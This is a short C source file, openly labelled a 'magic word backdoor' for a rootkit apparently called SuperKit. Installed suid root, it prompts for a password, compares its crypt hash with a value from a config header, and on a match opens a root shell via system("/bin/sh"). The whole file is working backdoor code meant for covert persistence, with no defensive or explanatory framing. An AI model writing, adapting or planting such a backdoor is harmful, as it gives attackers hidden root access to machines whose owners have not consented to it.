// Bash magic word backdoor made for SuperKit by mostarac <mostar@hotmail.com>
#include <pwd.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h> 
#include "../include/config.h"


int main(void){ 
  int olduid=500; 
  char phrase[16384]; 


  olduid=getuid(); 


  setuid(0); 
  if(getuid()){ 
    printf("program must be suid root.\n"); 
  } else { 

    printf("SuperUser Gateway V2.17 by Mos Tarac\n"); 


    if (strcmp((char *)crypt(getpass("Password: "), "SK"),PASSWORD)!=0) {
      // then it does not match. 
      printf("Sorry, wrong/unset password.\n"); 
      setuid(olduid); 
    } 
    else{ 
      printf("Welcome back. Have fun.\n"); 
      system("/bin/sh"); 
    } 
  } 
  return 0; 
} 

